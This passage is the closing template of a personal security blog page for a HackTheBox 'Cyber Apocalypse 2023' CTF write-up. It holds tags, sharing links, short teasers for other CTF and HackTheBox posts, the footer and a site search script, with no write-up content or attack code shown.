          class="post-tag no-text-decoration" >hackthebox</a><a href="/tags/web/"
          class="post-tag no-text-decoration" >web</a><a href="/tags/linux/"
          class="post-tag no-text-decoration" >linux</a><a href="/tags/windows/"
          class="post-tag no-text-decoration" >windows</a><a href="/tags/jeopardy/"
          class="post-tag no-text-decoration" >jeopardy</a><a href="/tags/ctf/"
          class="post-tag no-text-decoration" >ctf</a><a href="/tags/forensics/"
          class="post-tag no-text-decoration" >forensics</a><a href="/tags/web/"
          class="post-tag no-text-decoration" >web</a><a href="/tags/misc/"
          class="post-tag no-text-decoration" >misc</a><a href="/tags/reversing/"
          class="post-tag no-text-decoration" >reversing</a><a href="/tags/competiton/"
          class="post-tag no-text-decoration" >competiton</a></div><div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a> by the author.</div><!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons"><a href="https://twitter.com/intent/tweet?text=Cyber Apocalypse 2023 - HackTheBox - 4g3nt47&url=https://4g3nt47.github.io/posts/hackthebox/cyberapoc_23.html" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a><a href="https://www.facebook.com/sharer/sharer.php?title=Cyber Apocalypse 2023 - HackTheBox - 4g3nt47&u=https://4g3nt47.github.io/posts/hackthebox/cyberapoc_23.html" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a><a href="https://telegram.me/share?text=Cyber Apocalypse 2023 - HackTheBox - 4g3nt47&url=https://4g3nt47.github.io/posts/hackthebox/cyberapoc_23.html" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a><i id="copy-link" class="fa-fw fas fa-link small"
        data-toggle="tooltip" data-placement="top"
        title="Copy link"
        title-succeed="Link copied successfully!">
    </i>

  </span>
</div>
</div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->

</div>
  </div> <!-- #core-wrapper -->

  <!-- pannel -->
  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">

    <div class="access"><!--<div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3"><a class="post-tag" href="/tags/hackthebox/">hackthebox</a><a class="post-tag" href="/tags/linux/">linux</a><a class="post-tag" href="/tags/web/">web</a><a class="post-tag" href="/tags/static-analysis/">static analysis</a><a class="post-tag" href="/tags/command-injection/">command injection</a><a class="post-tag" href="/tags/custom-exploitation/">custom exploitation</a><a class="post-tag" href="/tags/dvwa/">dvwa</a><a class="post-tag" href="/tags/python/">python</a><a class="post-tag" href="/tags/lfi/">lfi</a><a class="post-tag" href="/tags/rce/">rce</a></div>
  </div>-->
    </div><!-- BS-toc.js will be loaded at medium priority -->
<script src="/assets/js/bootstrap-toc.min.js"></script>

<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
  <div class="panel-heading pl-3 pt-2 mb-2">Contents</div>
  <nav id="toc" data-toggle="toc"></nav>
</div></div>

</div>

<!-- tail --><div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
    <div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  --><!-- An random integer that bigger than 0  --><!-- Equals to TAG_SCORE / {max_categories_hierarchy}  --><!-- Fill with the other newlest posts  --><div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4"><div class="card">
        <a href="/posts/ctf/synack5.html">
          <div class="card-body"><!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
--><em class="timeagosmall"
    date="2021-11-08 00:00:00 +0100">Nov  8, 2021</em>
<h3 class="pt-0 mt-1 mb-3" data-toc-skip>Synack Red Team 5 CTF</h3>
            <div class="text-muted small">
              <p>Synack Red Team 5 CTF was (iirc) my third CTF, and the first in which I actually managed to score some decent points. It’s a jeopardy-styled CTF featuring 6 categories (web, pwn, crypto, forensics,...
              </p>
            </div>
          </div>
        </a>
      </div><div class="card">
        <a href="/posts/hackthebox/paper.html">
          <div class="card-body"><!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
--><em class="timeagosmall"
    date="2022-06-18 00:00:00 +0100">Jun 18, 2022</em>
<h3 class="pt-0 mt-1 mb-3" data-toc-skip>Paper - HackTheBox</h3>
            <div class="text-muted small">
              <p>Paper is a nice and easy linux box. It starts with a wordpress site that can be exploited to leak user drafts, which will lead you to an instance of RocketChat with a custom bot that’s vulnerable t...
              </p>
            </div>
          </div>
        </a>
      </div><div class="card">
        <a href="/posts/hackthebox/catch.html">
          <div class="card-body"><!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
--><em class="timeagosmall"
    date="2022-08-16 00:00:00 +0100">Aug 16, 2022</em>
<h3 class="pt-0 mt-1 mb-3" data-toc-skip>Catch - HackTheBox</h3>
            <div class="text-muted small">
              <p>Catch is a very interesting medium-rated linux box on HackTheBox. It starts with some light reversing of an android application to obtain an access token for the Let’s Chat API running on the host....
              </p>
            </div>
          </div>
        </a>
      </div></div> <!-- .card-deck -->
  </div> <!-- #related-posts --><!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between"><a href="/posts/hackthebox/redpanda.html" class="btn btn-outline-primary"
    prompt="Older">
    <p>RedPanda - HackTheBox</p>
  </a><a href="/posts/hackthebox/precious.html" class="btn btn-outline-primary"
    prompt="Newer">
    <p>Precious - HackTheBox</p>
  </a></div>
<!--  The comments switcher --></div>
  </div>
</div> <!-- .row --><!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center text-muted">
    <div class="footer-left">
      <p class="mb-0">
        © 2023
        <a href="https://twitter.com/UmarAbdoul">Umar Abdul</a>.<span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p>
    </div>

    <div class="footer-right">
      <p class="mb-0">Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.

      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>
</div><!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints"><div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3"><a class="post-tag" href="/tags/hackthebox/">hackthebox</a><a class="post-tag" href="/tags/linux/">linux</a><a class="post-tag" href="/tags/web/">web</a><a class="post-tag" href="/tags/static-analysis/">static analysis</a><a class="post-tag" href="/tags/command-injection/">command injection</a><a class="post-tag" href="/tags/custom-exploitation/">custom exploitation</a><a class="post-tag" href="/tags/dvwa/">dvwa</a><a class="post-tag" href="/tags/python/">python</a><a class="post-tag" href="/tags/lfi/">lfi</a><a class="post-tag" href="/tags/rce/">rce</a></div>
  </div></div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>
</div> <!-- #main-wrapper --><div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a><!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
--><script src="/assets/js/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>
<!--
  JS selector for site.
-->

<!-- layout specified --><!-- image lazy-loading & popup -->
  <script src="/assets/js/clipboard.min.js"></script><script defer src="/assets/js/dist/post.min.js"></script><!-- commons -->

<script src="/assets/js/bootstrap.min.js"></script></body>

</html>
